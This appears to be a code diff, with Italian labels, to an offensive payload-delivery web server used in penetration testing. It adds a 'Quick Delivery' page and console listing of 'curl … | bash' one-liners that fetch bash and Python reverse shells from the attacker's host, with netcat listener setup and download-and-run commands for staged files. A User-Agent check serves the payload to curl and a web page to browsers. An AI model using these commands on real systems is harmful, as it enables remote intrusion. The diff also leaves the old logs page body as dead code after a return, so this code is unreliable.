@@ -364,6 +364,25 @@ line-height:1.5}
 /* Logs */
 .log-table-wrap{max-height:65vh;overflow-y:auto;border:1px solid var(--border);
 border-radius:6px;background:var(--bg)}
+
+/* Delivery */
+.delivery-card{background:var(--surface);border:1px solid var(--border);border-radius:6px;
+padding:16px 20px;margin:10px 0;transition:border-color .15s}
+.delivery-card:hover{border-color:var(--accent)}
+.dc-header{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+.dc-endpoint{background:rgba(88,166,255,.15);color:var(--accent);font-weight:700;
+padding:2px 10px;border-radius:3px;font-family:'JetBrains Mono',monospace;font-size:14px}
+.dc-title{font-weight:600;color:var(--text);font-size:15px}
+.dc-desc{color:var(--text2);font-size:13px;margin-bottom:8px}
+.dc-cmd{background:var(--bg);border:1px solid var(--border);border-radius:4px;
+padding:8px 12px;font-size:13px;font-family:'JetBrains Mono',monospace;margin-bottom:6px;
+overflow-x:auto}
+.dc-cmd code{color:var(--green)}
+.dc-prereq{font-size:11px;color:var(--text2)}
+.dc-prereq code{color:var(--yellow);font-size:11px}
+.dc-fname{font-weight:600;color:var(--accent)}
+.dc-fsize{color:var(--text2);white-space:nowrap}
+.dc-fcmd code{color:var(--green);font-size:12px}
 .log-table{width:100%;border-collapse:collapse;font-size:13px;font-family:'JetBrains Mono',monospace}
 .log-table thead{position:sticky;top:0;background:var(--surface);z-index:1}
 .log-table th{text-align:left;padding:8px 12px;font-weight:600;color:var(--text2);
@@ -482,6 +501,7 @@ def _base_html(title: str, body: str, active: str = "") -> str:
         ("/vuln/", "Vuln", "vuln"),
         ("/tools/", "Tools", "tools"),
         ("/static/", "Static", "static"),
+        ("/delivery", "Delivery", "delivery"),
         ("/logs", "Logs", "logs"),
     ]
     nav_html = ""
@@ -589,6 +609,7 @@ def _page_home() -> str:
       <li><a href="/vuln/">Vuln</a><span class="cnt">{n_vulns} protocolli</span></li>
       <li><a href="/tools/">Tools</a><span class="cnt">{n_tools} tool</span></li>
       <li><a href="/static/">Static</a><span class="cnt">{n_static} file</span></li>
+      <li><a href="/delivery">Delivery</a><span class="cnt">payload &amp; curl</span></li>
       <li><a href="/logs">Logs</a><span class="cnt">server logs</span></li>
     </ul>
   </div>
@@ -618,6 +639,7 @@ def _page_home() -> str:
     {{name:'vuln',label:'Vuln',cnt:'{n_vulns} protocolli',href:'/vuln/'}},
     {{name:'tools',label:'Tools',cnt:'{n_tools} tool',href:'/tools/'}},
     {{name:'static',label:'Static',cnt:'{n_static} file',href:'/static/'}},
+    {{name:'delivery',label:'Delivery',cnt:'payload & curl',href:'/delivery'}},
     {{name:'logs',label:'Logs',cnt:'server logs',href:'/logs'}},
   ];
   const input=document.getElementById('term-input');
@@ -962,7 +984,78 @@ def _extract_search_context(text: str, query_lower: str, max_len: int = 120) -> 
     return ""
 
 
-def _page_logs() -> str:
+def _page_delivery() -> str:
+    if _server is not None:
+        port = _server.server_address[1]
+        base = f"http://{_lhost}:{port}"
+    else:
+        base = "http://&lt;LHOST&gt;:2727"
+
+    ep_cards = ""
+    endpoints = [
+        ("upgrade", "Upgrade Shell", "Trasforma una shell instabile in una TTY interattiva (socat/python pty)",
+         f"curl {base}/upgrade | bash",
+         "Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:4444</code>"),
+        ("rev", "Reverse Shell Bash", "One-liner bash per reverse shell",
+         f"curl {base}/rev | bash",
+         "Prerequisito: <code>nc -lvnp 4444</code>"),
+        ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
+         f"curl {base}/sh | bash",
+         "Prerequisito: <code>nc -lvnp 4444</code>"),
+    ]
+    for key, title, desc, curl_cmd, prereq in endpoints:
+        ep_cards += f"""<div class="delivery-card">
+<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
+<div class="dc-desc">{desc}</div>
+<div class="dc-cmd"><code>{html.escape(curl_cmd)}</code></div>
+<div class="dc-prereq">{prereq}</div>
+</div>\n"""
+
+    files = []
+    if STATIC_ROOT.is_dir():
+        files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
+
+    file_rows = ""
+    for f in files:
+        name = f.name
+        size = f.stat().st_size
+        if size > 1_048_576:
+            label = f"{size / 1_048_576:.1f} MB"
+        elif size > 1024:
+            label = f"{size / 1024:.1f} KB"
+        else:
+            label = f"{size} B"
+        if name.endswith(".sh"):
+            cmd = f"curl {base}/{name} | bash"
+        elif name.endswith(".exe"):
+            cmd = f"curl {base}/{name} -o {name}"
+        else:
+            cmd = f"curl {base}/{name} -o {name} &amp;&amp; chmod +x {name}"
+        file_rows += f"""<tr>
+<td class="dc-fname">{html.escape(name)}</td>
+<td class="dc-fsize">{label}</td>
+<td class="dc-fcmd"><code>{cmd}</code></td></tr>\n"""
+
+    if not file_rows:
+        file_rows = '<tr><td colspan="3" style="text-align:center;color:var(--text2);padding:20px">Nessun file in static/</td></tr>'
+
+    lport_info = f"LHOST: <code>{html.escape(_lhost or '?')}</code> &nbsp;|&nbsp; LPORT: <code>{_lport}</code>"
+
+    body = f"""<div class="container">
+<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Delivery</div>
+<div class="page-title">Quick Delivery</div>
+<div class="page-sub">{lport_info}</div>
+<h3 style="margin:24px 0 12px;color:var(--text)">Endpoint dinamici</h3>
+{ep_cards}
+<h3 style="margin:24px 0 12px;color:var(--text)">File statici ({len(files)})</h3>
+<div class="table-scroll">
+<table class="log-table" style="font-size:13px">
+<thead><tr><th>File</th><th style="width:80px">Size</th><th>Comando</th></tr></thead>
+<tbody>{file_rows}</tbody>
+</table>
+</div>
+</div>"""
+    return _base_html("Delivery", body, active="delivery")
     body = """\
 <div class="container">
 <div class="breadcrumb"><a href="/">Home</a> <span>/</span> Logs</div>
@@ -991,7 +1084,7 @@ def _page_logs() -> str:
   var countEl=document.getElementById('log-count');
   var statusEl=document.getElementById('log-status');
   var autoChk=document.getElementById('log-auto');
-  window._logReset=function(){offset=0;};
+  window._logReset=function(){fetch('/api/logs?since=0').then(function(r){return r.json();}).then(function(d){offset=d.total;});};
 
   function poll(){
     fetch('/api/logs?since='+offset)
@@ -1159,7 +1252,11 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             else:
                 self._send_html(_page_static_edit(name))
         elif path == "/delivery":
-            self._serve_index(pv)
+            ua = self.headers.get("User-Agent", "")
+            if "curl" in ua.lower():
+                self._serve_index(pv)
+            else:
+                self._send_html(_page_delivery())
         else:
             self._serve_static(path)
 
@@ -1505,17 +1602,25 @@ def fetch_tools(force: bool = False) -> str:
 
 
 def list_static() -> str:
-    if not STATIC_ROOT.is_dir():
-        return "Cartella static/ non trovata."
-    files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
-    if not files:
-        return "Nessun file in static/. Usa 'serve fetch' per scaricare i tool."
     if _server is not None:
         port = _server.server_address[1]
         base = f"http://{_lhost}:{port}"
     else:
         base = "http://<LHOST>:2727"
-    lines = [f"\nFile in static/ ({len(files)}):"]
+    lines = [
+        "\n\033[1mEndpoint dinamici:\033[0m",
+        f"  curl {base}/upgrade | bash   \033[90m# Upgrade shell (socat/python pty)\033[0m",
+        f"  curl {base}/rev | bash       \033[90m# Reverse shell Bash\033[0m",
+        f"  curl {base}/sh | bash        \033[90m# Reverse shell Python\033[0m",
+    ]
+    if not STATIC_ROOT.is_dir():
+        lines.append("\n\033[1mFile statici:\033[0m\n  Cartella static/ non trovata.")
+        return "\n".join(lines)
+    files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
+    if not files:
+        lines.append("\n\033[1mFile statici:\033[0m\n  Nessun file in static/. Usa 'serve fetch' per scaricare i tool.")
+        return "\n".join(lines)
+    lines.append(f"\n\033[1mFile statici ({len(files)}):\033[0m")
     for f in files:
         name = f.name
         if name.endswith(".sh"):
